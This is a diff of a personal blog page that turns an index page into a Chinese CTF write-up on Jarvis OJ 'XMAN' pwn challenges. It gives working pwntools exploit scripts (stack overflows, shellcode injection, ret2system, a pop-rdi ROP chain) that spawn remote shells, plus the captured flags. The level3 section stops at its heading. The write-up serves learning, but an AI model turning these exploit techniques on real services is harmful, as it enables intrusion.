@@ -6,14 +6,28 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://leo.dropsec.xyz">
-  <title>Leooel</title>
+  <title>Jarvis OJ PWN 入门学习 | Leooel</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Leooel">
-<meta property="og:url" content="http://leo.dropsec.xyz/page/4/index.html">
+  <meta name="description" content="背景知识：64位程序与32位程序有几处不同点，其中之一为参数传递方式不同，32位程序通过栈传参，64位优先寄存器，前6个参数保存在寄存器内，依次保存在rdi, rsi, rdx, rcx, r8, r9，剩余的参数，从右到左入栈。">
+<meta name="keywords" content="PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jarvis OJ PWN 入门学习">
+<meta property="og:url" content="http://leo.dropsec.xyz/2018/05/14/Jarvis-OJ-PWN-入门学习/index.html">
 <meta property="og:site_name" content="Leooel">
+<meta property="og:description" content="背景知识：64位程序与32位程序有几处不同点，其中之一为参数传递方式不同，32位程序通过栈传参，64位优先寄存器，前6个参数保存在寄存器内，依次保存在rdi, rsi, rdx, rcx, r8, r9，剩余的参数，从右到左入栈。">
+<meta property="og:image" content="http://leo.dropsec.xyz/2018/05/14/Jarvis-OJ-PWN-入门学习/01.PNG">
+<meta property="og:image" content="http://leo.dropsec.xyz/2018/05/14/Jarvis-OJ-PWN-入门学习/02.PNG">
+<meta property="og:image" content="http://leo.dropsec.xyz/2018/05/14/Jarvis-OJ-PWN-入门学习/03.PNG">
+<meta property="og:image" content="http://leo.dropsec.xyz/2018/05/14/Jarvis-OJ-PWN-入门学习/04.PNG">
+<meta property="og:image" content="http://leo.dropsec.xyz/2018/05/14/Jarvis-OJ-PWN-入门学习/05.PNG">
+<meta property="og:image" content="http://leo.dropsec.xyz/2018/05/14/Jarvis-OJ-PWN-入门学习/06.PNG">
+<meta property="og:image" content="http://leo.dropsec.xyz/2018/05/14/Jarvis-OJ-PWN-入门学习/07.PNG">
+<meta property="og:image" content="http://leo.dropsec.xyz/2018/05/14/Jarvis-OJ-PWN-入门学习/08.PNG">
+<meta property="og:updated_time" content="2018-05-14T13:54:16.053Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Leooel">
+<meta name="twitter:title" content="Jarvis OJ PWN 入门学习">
+<meta name="twitter:description" content="背景知识：64位程序与32位程序有几处不同点，其中之一为参数传递方式不同，32位程序通过栈传参，64位优先寄存器，前6个参数保存在寄存器内，依次保存在rdi, rsi, rdx, rcx, r8, r9，剩余的参数，从右到左入栈。">
+<meta name="twitter:image" content="http://leo.dropsec.xyz/2018/05/14/Jarvis-OJ-PWN-入门学习/01.PNG">
   
     <link rel="alternative" href="/atom.xml" title="Leooel" type="application/atom+xml">
   
@@ -151,34 +165,160 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-新手常见的17个Python运行时错误" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-Jarvis-OJ-PWN-入门学习" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/09/05/新手常见的17个Python运行时错误/">新手常见的17个Python运行时错误</a>
+    <h1 class="article-title" itemprop="name">
+      Jarvis OJ PWN 入门学习
     </h1>
   
 
         
-        <a href="/2017/09/05/新手常见的17个Python运行时错误/" class="archive-article-date">
-  	<time datetime="2017-09-05T11:37:37.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-05</time>
+        <a href="/2018/05/14/Jarvis-OJ-PWN-入门学习/" class="archive-article-date">
+  	<time datetime="2018-05-14T09:29:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-05-14</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>早计划学习python了，最近一段时间才缓缓展开行动…<br>自我感觉熟练python后可以很随意的编写程序，比C++方便多。</p>
-        
-          <a class="article-more-a" href="/2017/09/05/新手常见的17个Python运行时错误/#more">more >></a>
-        
+        <p>背景知识：64位程序与32位程序有几处不同点，其中之一为参数传递方式不同，32位程序通过栈传参，64位优先寄存器，前6个参数保存在寄存器内，依次保存在rdi, rsi, rdx, rcx, r8, r9，剩余的参数，从右到左入栈。<br><a id="more"></a></p>
+<h2 id="一、-XMAN-level0"><a href="#一、-XMAN-level0" class="headerlink" title="一、[XMAN]level0"></a>一、[XMAN]level0</h2><p><a href="https://pan.baidu.com/s/1W8-cMtMrRKLXwinnxd3voQ" target="_blank" rel="external">下载链接</a><br>题目描述： nc pwn2.jarvisoj.com 9881</p>
+<p>file查看文件信息，64位程序；checksec后发现开了NX，然后拉进ida找到两个关键函数<br><img src="/2018/05/14/Jarvis-OJ-PWN-入门学习/01.PNG" alt=""></p>
+<p><img src="/2018/05/14/Jarvis-OJ-PWN-入门学习/02.PNG" alt=""><br>buffer的大小是0x80，而read函数直接读取0x200的数据，有典型的栈溢出漏洞。由于rbp中有0x8个字节，我们的padding需要0x80 + 0x8字节。填满buffer后调用callsystem函数即可get shell。<br>脚本如下：</p>
+<pre><code>from pwn import *
+sh = remote(&apos;pwn2.jarvisoj.com&apos;, 9881)
+padding = &apos;A&apos; * 0x88
+callsystem = 0x400596
+#构造payload。
+payload = padding + p64(callsystem)
+#交互
+sh.send(payload)
+sh.interactive()
+</code></pre><p>p64()默认将int转为little-endian bytes。32位文件用p32()，例如：</p>
+<pre><code>&gt;&gt;&gt; p64(0xdeadbeef)
+&apos;\xef\xbe\xad\xde&apos;
+
+CTF{713ca3944e92180e0ef03171981dcd41}
+</code></pre><h2 id="二、-XMAN-level1"><a href="#二、-XMAN-level1" class="headerlink" title="二、[XMAN]level1"></a>二、[XMAN]level1</h2><p><a href="https://pan.baidu.com/s/1uxfsvWEGMBPy2SO4Y_llBA" target="_blank" rel="external">下载链接</a><br>题目描述： nc pwn2.jarvisoj.com 9877</p>
+<p>file查看文件信息，32位程序；checksec后没开常用保护机制 ida查看发现有一个关键函数<br><img src="/2018/05/14/Jarvis-OJ-PWN-入门学习/03.PNG" alt=""><br>这次没有callsystem函数，<strong>需要生成shellcode</strong>。没有开启NX保护，可以插入shellcode。这里buf有0x88个字节，再加上ret本身的0x4个字节，偏移量为0x8C，还要减去shellcode的长度。连接到服务器，发现每次会随机给出一个地址，类似这样：</p>
+<pre><code>yl123456@ubuntu:~/Desktop$ nc pwn2.jarvisoj.com 9877
+What&apos;s this:0xfff180b0?
+</code></pre><p>编写脚本的时候要读取这个地址，将其定义为buf_addr。 脚本如下：</p>
+<pre><code>from pwn import *
+#调用pwntools自带的功能生成shellcode
+shellcode = asm(shellcraft.sh())
+io = remote(&apos;pwn2.jarvisoj.com&apos;, 9877)
+#提取给出的地址并将string转为int
+buf_addr = int(io.recvline()[14:-2], 16)
+#构造payload
+payload = shellcode + &apos;A&apos; * (0x8C -len(shellcode)) + p32(buf_addr)
+io.send(payload)
+io.interactive()
+</code></pre><p>第二种写法：</p>
+<pre><code>from pwn import *
+p = remote(&quot;pwn2.jarvisoj.com&quot;,9877)
+shellcode = asm(shellcraft.sh())
+p.recvuntil(&quot;What&apos;s this:&quot;)
+buf_addr = int(p.recvuntil(&quot;?&quot;)[:-1],16)
+payload = shellcode.ljust(140,&apos;a&apos;) + p32(buf_addr)
+p.send(payload)
+p.interactive()
+
+CTF{82c2aa534a9dede9c3a0045d0fec8617}
+</code></pre><h2 id="三、-XMAN-level2"><a href="#三、-XMAN-level2" class="headerlink" title="三、[XMAN]level2"></a>三、[XMAN]level2</h2><p><a href="https://pan.baidu.com/s/1pF_aPbWrZIQInAmk7HMmVA" target="_blank" rel="external">下载链接</a><br>题目描述： nc pwn2.jarvisoj.com 9878</p>
+<p>file查看文件信息，32位程序；checksec发现开了NX保护 ida查看关键函数<br><img src="/2018/05/14/Jarvis-OJ-PWN-入门学习/04.PNG" alt=""></p>
+<p><img src="/2018/05/14/Jarvis-OJ-PWN-入门学习/05.PNG" alt=""><br>字符串里还发现有/bin/sh 我们<strong>需要构造system(“/bin/sh”)</strong>。<br>脚本如下：</p>
+<pre><code>from pwn import *
+sh = remote(&apos;pwn2.jarvisoj.com&apos;, 9878)
+#指定elf文件
+elf = ELF(&apos;./level2&apos;)
+#定位system函数地址
+sys_addr = elf.symbols[&apos;system&apos;]
+#定位/bin/sh的地址
+sh_addr = elf.search(&apos;/bin/sh&apos;).next()
+#注意这里的p32(4)是虚拟的返回地址，输入什么都可以
+payload = &apos;A&apos; * 0x8C + p32(sys_addr) + p32(4) + p32(sh_addr)
+sh.send(payload)
+sh.interactive()
+</code></pre><p>也可以不用定位函数，因为没开启PIE保护，所以直接用ida找到system函数、/bin/sh对应对应的地址也ok</p>
+<pre><code>from pwn import *
+sys_addr = 0x08048320
+sh_addr = 0x0804A024
+payload = &apos;A&apos; * 0x8C + p32(sys_addr) + p32(4) + p32(sh_addr)
+sh = remote(&apos;pwn2.jarvisoj.com&apos;, 9878)
+sh.send(payload)
+sh.interactive()
+
+CTF{1759d0cbd854c54ffa886cd9df3a3d52}
+</code></pre><h2 id="四、-XMAN-level2-x64"><a href="#四、-XMAN-level2-x64" class="headerlink" title="四、[XMAN]level2(x64)"></a>四、[XMAN]level2(x64)</h2><p><a href="https://pan.baidu.com/s/1Ty6NhgP6rQQNDkLgqc8TKw" target="_blank" rel="external">下载链接</a><br>题目描述： nc pwn2.jarvisoj.com 9882</p>
+<p>file查看文件信息，64位程序；checksec发现开了NX保护 ida查看关键函数<br><img src="/2018/05/14/Jarvis-OJ-PWN-入门学习/06.PNG" alt=""></p>
+<p><img src="/2018/05/14/Jarvis-OJ-PWN-入门学习/07.PNG" alt=""><br>和level2有点类似  同样能看到/bin/sh<br>我们可以找到system函数，/bin/sh的地址，而且可以得到0x88个字节就会溢出，这样前期准备就都做好了，剩下的就是如何将参数传递给rdi寄存器，因此，我们需要一些gadget来满足我们的需求</p>
+<pre><code>命令： ROPgadget --binary level2_x64 --only &apos;pop|ret&apos;
+</code></pre><p><img src="/2018/05/14/Jarvis-OJ-PWN-入门学习/08.PNG" alt=""><br>这样，我们可以很容易的找到pop rdi,地址为0x00000000004006b3</p>
+<pre><code>from pwn import *
+p = remote(&quot;pwn2.jarvisoj.com&quot;,9882)
+elf = ELF(&quot;./level2_x64&quot;)
+pop_rdi_ret_addr = 0x00000000004006b3
+system_plt = elf.plt[&apos;system&apos;]
+sh_addr = next(elf.search(&quot;/bin/sh&quot;))
+payload = &apos;a&apos; * 0x88
+payload += p64(pop_rdi_ret_addr)
+payload += p64(sh_addr)
+payload += p64(system_plt)
+p.send(payload)
+p.interactive()
+</code></pre><p>或者直接找地址：</p>
+<pre><code>from pwn import *
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9882)
+sh_addr=0x600a90
+sys_addr=0x4004c0
+popret=0x00000000004006b3
+payload=&apos;a&apos;*0x88 + p64(popret) + p64(sh_addr) + p64(sys_addr)  
+p.send(payload)
+p.interactive()
+
+CTF{081ecc7c8d658409eb43358dcc1cf446}
+</code></pre><p>另外发现网上有些wp尝试在payload上加p64(1),后来发现此题不用加，若加必须加在最后一位才可，倒数第二位就不可。</p>
+<p><strong><em>疑问： 怎么区分加与不加(与上一题比较)？</em></strong></p>
+<h2 id="五、-XMAN-level3"><a href="#五、-XMAN-level3" class="headerlink" title="五、[XMAN]level3"></a>五、[XMAN]level3</h2><p><a href="https://pan.baidu.com/s/1v1cvRZ-QU_G-KFqUqCIgPQ" target="_blank" rel="external">下载链接</a><br>题目描述： nc pwn2.jarvisoj.com 9879</p>
+
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请Leo吃糖果哦<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/1.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/2.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -189,7 +329,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PWN</a>
         		</li>
       		
 		</ul>
@@ -198,566 +338,74 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/09/05/新手常见的17个Python运行时错误/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://leo.dropsec.xyz/2018/05/14/Jarvis-OJ-PWN-入门学习/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
 
-
-
-
-
   
-    <article id="post-实验吧逆向脱壳-汇总" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+<nav id="article-nav">
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/09/01/实验吧逆向脱壳-汇总/">实验吧逆向脱壳 汇总</a>
-    </h1>
   
-
-        
-        <a href="/2017/09/01/实验吧逆向脱壳-汇总/" class="archive-article-date">
-  	<time datetime="2017-09-01T06:05:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>实验吧的五个逆向脱壳实验，汇总一下。</p>
-        
-          <a class="article-more-a" href="/2017/09/01/实验吧逆向脱壳-汇总/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">二进制逆向</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/09/01/实验吧逆向脱壳-汇总/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
+    <a href="/2018/05/06/iscc2018-My-math-is-bad/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">iscc2018 My math is bad</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
-    <article id="post-实验吧逆向破解-汇总" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/31/实验吧逆向破解-汇总/">实验吧逆向破解 汇总</a>
-    </h1>
-  
-
-        
-        <a href="/2017/08/31/实验吧逆向破解-汇总/" class="archive-article-date">
-  	<time datetime="2017-08-31T12:40:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>用了好长时间看完了这十九个实验，总该有些收获吧，简单汇总一下，方便之后的记忆…</p>
-        
-          <a class="article-more-a" href="/2017/08/31/实验吧逆向破解-汇总/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">二进制逆向</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/08/31/实验吧逆向破解-汇总/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-  
-    <article id="post-OK-天津" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/28/OK-天津/">OK 天津</a>
-    </h1>
-  
-
-        
-        <a href="/2017/08/28/OK-天津/" class="archive-article-date">
-  	<time datetime="2017-08-28T13:29:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>8.24–8.28 与三友共浪天津，回来之后迫不及待的想记录一点东西…</p>
-<p><img src="/2017/08/28/OK-天津/00.jpg" alt=""></p>
-        
-          <a class="article-more-a" href="/2017/08/28/OK-天津/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">杂儿</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/08/28/OK-天津/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-  
-    <article id="post-CrackMe-008" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/24/CrackMe-008/">CrackMe 008</a>
-    </h1>
-  
-
-        
-        <a href="/2017/08/24/CrackMe-008/" class="archive-article-date">
-  	<time datetime="2017-08-24T02:48:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-24</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>经过了前两天的煎熬，总算遇到一个简单点的题了。。。呜呜呜，我也是很激动(。・∀・)ノ<br></p>
-        
-          <a class="article-more-a" href="/2017/08/24/CrackMe-008/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">二进制逆向</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/08/24/CrackMe-008/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-  
-    <article id="post-CrackMe-007-补" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/23/CrackMe-007-补/">CrackMe 007 补</a>
-    </h1>
-  
-
-        
-        <a href="/2017/08/23/CrackMe-007-补/" class="archive-article-date">
-  	<time datetime="2017-08-23T14:12:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-23</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>标题创建于八月二十三，内容写于二十四。加油，Crack 007<br></p>
-        
-          <a class="article-more-a" href="/2017/08/23/CrackMe-007-补/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">二进制逆向</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/08/23/CrackMe-007-补/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-  
-    <article id="post-CrackMe-006-占位（总结五种语言按钮事件的找法）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/22/CrackMe-006-占位（总结五种语言按钮事件的找法）/">CrackMe 006 占位（总结五种语言按钮事件的找法）</a>
-    </h1>
-  
-
-        
-        <a href="/2017/08/22/CrackMe-006-占位（总结五种语言按钮事件的找法）/" class="archive-article-date">
-  	<time datetime="2017-08-22T12:57:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>我想我可以去die了…<br>CrackMe 006也有点难。。。<br>伤心<br></p>
-        
-          <a class="article-more-a" href="/2017/08/22/CrackMe-006-占位（总结五种语言按钮事件的找法）/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">二进制逆向</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/08/22/CrackMe-006-占位（总结五种语言按钮事件的找法）/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-  
-    <article id="post-CrackMe-005-占位" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/21/CrackMe-005-占位/">CrackMe 005 占位 {{{(&gt;_&lt;)}}}</a>
-    </h1>
-  
-
-        
-        <a href="/2017/08/21/CrackMe-005-占位/" class="archive-article-date">
-  	<time datetime="2017-08-21T13:34:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-21</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>呃，CrackMe 005有点难…题解也老长了，暂时记下，日后等水平稍微提升一点点再来战它。<br></p>
-        
-          <a class="article-more-a" href="/2017/08/21/CrackMe-005-占位/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">二进制逆向</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/08/21/CrackMe-005-占位/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-  
-    <article id="post-CrackMe-004" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/20/CrackMe-004/">CrackMe 004</a>
-    </h1>
-  
-
-        
-        <a href="/2017/08/20/CrackMe-004/" class="archive-article-date">
-  	<time datetime="2017-08-20T13:03:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>首先说一下，这个题是比较有“脾气”的。OK，咱们就来看看它到底是什么脾气…<br></p>
-        
-          <a class="article-more-a" href="/2017/08/20/CrackMe-004/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">二进制逆向</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/08/20/CrackMe-004/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-  
-    <article id="post-CrackMe-003" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/19/CrackMe-003/">CrackMe 003</a>
-    </h1>
-  
-
-        
-        <a href="/2017/08/19/CrackMe-003/" class="archive-article-date">
-  	<time datetime="2017-08-19T07:13:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>算法部分又出新花样，在第二题之上加入了浮点运算，加上战线拉的长，需要耐心分析方可得出Key… en,最后再加个解除延时…   [多看看浮点汇编运算]<br></p>
-        
-          <a class="article-more-a" href="/2017/08/19/CrackMe-003/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">二进制逆向</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/08/19/CrackMe-003/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
+</nav>
 
 
 
@@ -765,9 +413,10 @@
 
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
-    </nav>
+  
+
+  
+
   
 
 
@@ -790,8 +439,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
